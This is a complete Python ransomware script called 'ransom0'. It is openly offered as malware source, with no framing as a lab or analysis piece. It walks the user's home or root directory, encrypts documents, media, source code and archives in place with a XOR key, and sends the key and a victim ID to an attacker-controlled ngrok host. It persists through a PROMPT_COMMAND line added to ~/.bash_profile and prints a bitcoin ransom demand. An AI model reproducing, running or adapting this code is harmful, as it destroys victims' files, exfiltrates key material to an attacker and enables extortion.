#!/usr/local/bin/python3
import os
import shutil
import http.client
import subprocess
import base64
import sys

from datetime import datetime
from os import name, path, remove
from random import randint


class Crypto:
    def __init__(self, raw_key=None, pretty_key=None):
        if raw_key is not None:
            self.key = raw_key
        elif pretty_key is not None:
            self.key = base64.urlsafe_b64decode(pretty_key)
        else:
            raise ValueError('No key provided')

    def encrypt(self, data):
        encrypted = bytearray(len(data))
        for i in range(len(data)):
            encrypted[i] = self.key[i % len(self.key)] ^ data[i]

        return bytes(encrypted)

    def decrypt(self, data):
        return self.encrypt(data)

    def pretty_key(self):
        return base64.urlsafe_b64encode(self.key)

    @classmethod
    def generate_key(cls, len_bytes=4):
        return os.urandom(len_bytes)


digits = randint(1111, 9999)
crypto = Crypto(Crypto.generate_key(32))
key = crypto.key

url = 'm1'  # PUT THE URL YOU GOT FROM NGROK HERE


def encrypt_root():
    return sys.argv[1] == 'root'


class ransom0:
    username = os.getlogin()
    PATH = os.getcwd()

    EXCLUDE_DIRECTORY = (   '/usr', #Mac/Linux system directory
                            '/Library/',
                            '/System',
                            '/Applications',
                            '.Trash',
                            #Windows system directory
                            'Program Files',
                            'Program Files (x86)',
                            'Windows',
                            '$Recycle.Bin',
                            'AppData',
                            
                            'logs',

        )

    EXTENSIONS = (
        # '.exe,', '.dll', '.so', '.rpm', '.deb', '.vmlinuz', '.img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
        '.jpg', '.jpeg', '.bmp', '.gif', '.png', '.svg', '.psd', '.raw', # images
        '.mp3','.mp4', '.m4a', '.aac','.ogg','.flac', '.wav', '.wma', '.aiff', '.ape', # music and sound
        '.avi', '.flv', '.m4v', '.mkv', '.mov', '.mpg', '.mpeg', '.wmv', '.swf', '.3gp', # Video and movies

        '.doc', '.docx', '.xls', '.xlsx', '.ppt','.pptx', # Microsoft office
        '.odt', '.odp', '.ods', '.txt', '.rtf', '.tex', '.pdf', '.epub', '.md', '.txt', # OpenOffice, Adobe, Latex, Markdown, etc
        '.yml', '.yaml', '.json', '.xml', '.csv', # structured data
        '.db', '.sql', '.dbf', '.mdb', '.iso', # databases and disc images
        
        '.html', '.htm', '.xhtml', '.php', '.asp', '.aspx', '.js', '.jsp', '.css', # web technologies
        '.c', '.cpp', '.cxx', '.h', '.hpp', '.hxx', # C source code
        '.java', '.class', '.jar', # java source code
        '.ps', '.bat', '.vb', '.vbs' # windows based scripts
        '.awk', '.sh', '.cgi', '.pl', '.ada', '.swift', # linux/mac based scripts
        '.go', '.py', '.pyc', '.bf', '.coffee', # other source code files

        '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak',  # compressed formats
            )

    EXTENSIONS += tuple(map(lambda s: s.upper(), EXTENSIONS))

    def clear(self): 
        subprocess.call('cls' if os.name == 'nt' else 'clear', shell=False)
        os.system('cls' if os.name == 'nt' else 'clear')
    def FindFiles(self):
        f = open("logs/path.txt", "w")
        cnt = 0

        start_path = '~'
        if encrypt_root():
            start_path = '/'

        for root, dirs, files in os.walk(path.expanduser(start_path)):
            if any(s in root for s in self.EXCLUDE_DIRECTORY):
                pass
            else:
                for file in files:
                    if file.endswith('ransom0.py'):
                        continue

                    if file.endswith(self.EXTENSIONS):
                        TARGET = os.path.join(root, file)
                        f.write(TARGET+'\n')
                        print(root)

        f.close()
        f = open("logs/cnt.txt", "w")
        f.write(str(cnt))
        f.close()

    def Encrypt(self, filename):
        f = Crypto(key)
        with open(filename, "rb") as file:
            file_data = file.read()
        encrypted_data = f.encrypt(file_data)
        with open(filename, "wb") as file:
            file.write(encrypted_data)
        print(filename)

def SendData(decrypted): 
    now = datetime.now()
    date = now.strftime("%d/%m/%Y %H:%M:%S")
    data = f'[{digits}, {crypto.pretty_key()}, "{date}", "{decrypted}"]'

    con = http.client.HTTPConnection(url, 8000)
    con.request('POST', '', data)
    con.getresponse()
    con.close()


ransom0 = ransom0()


def StartRansom():
    try:
        ransom0.FindFiles()
        filepath = 'logs/path.txt'
        with open(filepath) as fp:
            line = fp.readline()
            while line:
                filename = line.strip()
                try:
                    ransom0.Encrypt(filename)
                except Exception:
                    print("!Permission denied")
                line = fp.readline()
        fp.close()
        SendData('false')
    except FileNotFoundError:
        os.mkdir("logs")
        f = open("logs/digits.txt", "w")
        f.write(str(digits))
        f.close()
        StartRansom()


PATH = os.getcwd()


def DECRYPT_FILE():
    print('YOUR FILES HAVE BEEN ENCRYPTED')
    print('YOUR IMPORTANT DOCUMENTS, DATAS, PHOTOS, VIDEOS HAVE BEEN ENCRYPTED WITH MILITARY GRADE ENCRYPTION AND A UNIQUE KEY.')
    print('to decrypt them, send 50$ in bitcoin to BITCOIN_ADRESS, and them send proof of transfer and your DIGIT to mail@mail.com')
    print('YOUR DIGIT IS {}'.format(digits))
    pretty_key = input("Your decryption key: ")

    def decrypt(filename):
        f = Crypto(pretty_key=pretty_key)
        with open(filename, "rb") as file:
            encrypted_data = file.read()
        decrypted_data = f.decrypt(encrypted_data)
        with open(filename, "wb") as file:
            file.write(decrypted_data)

    with open('logs/path.txt') as fp:
        line = fp.readline()
        while line:
            filename = line.strip()
            try:
                print('Decrypting {}'.format(filename))
                decrypt(filename)
            except PermissionError:
                print("!Permission Denied")
            line = fp.readline()

        print('YOUR FILES HAVE BEEN DECRYPTED')
        shutil.rmtree(PATH+'/logs', ignore_errors=True)

    SendData('true')


if __name__ == '__main__':
    bashrc_path = path.expanduser('~/.bash_profile')
    decrypted_path = path.expanduser('~/.decrypted')
    prompt_cmd = "export PROMPT_COMMAND=~/ransom0.py"

    if path.exists(decrypted_path) and not encrypt_root():
        exit(0)

    if path.exists(bashrc_path):
        with open(bashrc_path) as f:
            bashrc_content = f.read()

        if bashrc_content.strip().endswith(prompt_cmd):
            pass
        else:
            f = open(bashrc_path, 'a')
            f.write("\n{}\n".format(prompt_cmd))
            f.close()
    else:
        f = open(bashrc_path, 'w')
        f.write("{}\n".format(prompt_cmd))
        f.close()

    # Generate digits ID or read generated value from digits.txt
    if path.exists("logs") is True:
        f = open("logs/digits.txt", "r")
        digits = f.read()
        f.close()
        DECRYPT_FILE()
        f = open(decrypted_path, 'w')
        f.close()
        remove(bashrc_path)
    else:
        os.mkdir("logs")
        f = open("logs/digits.txt", "w")
        f.write(str(digits))
        f.close()
        StartRansom()
